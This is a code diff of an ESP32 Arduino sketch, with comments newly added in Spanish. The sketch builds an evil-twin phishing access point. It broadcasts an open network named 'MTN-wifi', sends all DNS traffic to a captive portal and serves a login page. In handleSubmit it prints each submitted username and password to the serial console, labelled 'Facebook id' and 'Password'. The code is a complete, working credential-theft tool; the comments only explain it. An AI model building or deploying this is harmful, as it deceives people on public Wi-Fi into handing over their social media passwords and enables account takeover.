@@ -1,21 +1,48 @@
+//incluir librerias para....
+
+//crear un punto de acceso wifi
 #include <WiFi.h>
 #include <WiFiAP.h>
+
+//crear un servidor web y configurar el redireccionamiento
 #include <WebServer.h>
 #include <DNSServer.h>
 
+//estos pueden ser utiles si se decide implementar comunicación entre placas
 #include <HTTPClient.h>
 #include <NetworkClientSecure.h>
 #include <NetworkClient.h>
 
+
+//definir pines para los LED
 #define CLIENT_LED 5
 #define ACTIVE_LED 2
 
-const byte DNS_PORT = 53;
+/***********************************************
+* El pin 2 servirá para comprobar que todo sigue
+* funcionando.
+*
+************************************************/
+
+
+//variable para el nombre del wifi
 const char* ssid    = "MTN-wifi";
+//hay la possibilidad de declarar también una variable password para crear una red privada en lugar de una publica
+
+//variables para el puerto de DNS
+const byte DNS_PORT = 53;
+
+//variable para iniciar un servidor en el puerto 80 (http)
+WebServer server(80);
+
+//variable para servidor DNS
+DNSServer dnsserver;
+
 
 //IPAddress gateway(192,168,1,1);
-IPAddress subnet(255,255,255,0);
+//IPAddress subnet(255,255,255,0);
 
+//pagina que saltará al conectarse a la wifi
 const char* htmlPage = R"=====(
 <!DOCTYPE html>
 <html lang="en">
@@ -99,6 +126,8 @@ const char* htmlPage = R"=====(
 </html>
 )=====";
 
+
+//pagina a la que se redigirá después de haber ingresado los datos
 const char *thankYouPage = R"=====(
 <!DOCTYPE html>
 <html lang="en">
@@ -162,42 +191,52 @@ const char *thankYouPage = R"=====(
 </html>
 )=====";
 
-WebServer server(80);
-DNSServer dnsserver;
-
 
 void setup() {
   Serial.begin(115200);
   delay(3000);
 
-  Serial.println("Configuring wifi access point.....");
+  Serial.println("Configurando el punto de acceso.....");
 
   pinMode(CLIENT_LED, OUTPUT);
   pinMode(ACTIVE_LED, OUTPUT);
 
-
-  if(!WiFi.softAP(ssid))
+  //se crea un punto de acceso con el nombre declarado más arriba
+  if(!WiFi.softAP(ssid)) //está función accepta un segundo parametro opcional que será la contraseña del wifi
   {
-    log_e("Soft AP creation failed.");
+    log_e("La creación Soft AP ha fallado."); 
     while(1);
   }
 
+  //se inicia el servidor DNS para redireccionar todas las solicitudes realizadas en la red
   dnsserver.start(DNS_PORT, "*", WiFi.softAPIP());
 
+  //variable para almacenar la dirección IP de la red
   IPAddress myIP = WiFi.softAPIP();
+
+  //imprimir por pantalla la dirección IP de la red
   Serial.print("AP IP address: ");
   Serial.println(myIP);
+
+  //se define la pagina raiz del servidor y llama a la función handleRoot
   server.on("/", handleRoot);
+
+  //cada vez que hay un submit se llama a la función handleSubmit
   server.on("/submit", handleSubmit);
+
+  //
   server.onNotFound(handleRoot);
+
+  //se inicia el servidor
   server.begin();
 
   Serial.println("Server started!");
 }
 
 void loop() {
-
+  //se enciede la luz para comprobar que se está ejecutando
   digitalWrite(ACTIVE_LED, HIGH);
+
   dnsserver.processNextRequest();
   server.handleClient();
   //NetworkClient client = server.accept();
@@ -255,17 +294,34 @@ void loop() {
   }*/
 }
 
+
+/***********************************************************************************
+* 
+*
+*
+*
+************************************************************************************/
 void handleRoot() {
+  //se envia una respueta con la primera pagina a cada solicitud de conexión
   server.send(200, "text/html", htmlPage);
 }
 
+/***********************************************************************************
+* Función para gestionar las entradas de usuario.
+* Se llamará a esta función cada vez que un usuario sube el formulario con los datos
+* solicitados.
+*
+************************************************************************************/
 void handleSubmit()
 {
+  //variables para almacenar temporalmente las entradas del usuario
   String username = server.arg("username");
   String password = server.arg("password");
 
+  //se imprime por consola los valores de las entradas
   Serial.println("Facebook id: "+ username);
   Serial.println("Password: "+ password);
 
+  //se envia una respuesta con la segunda pagina
   server.send(200, "text/html", thankYouPage);
 }
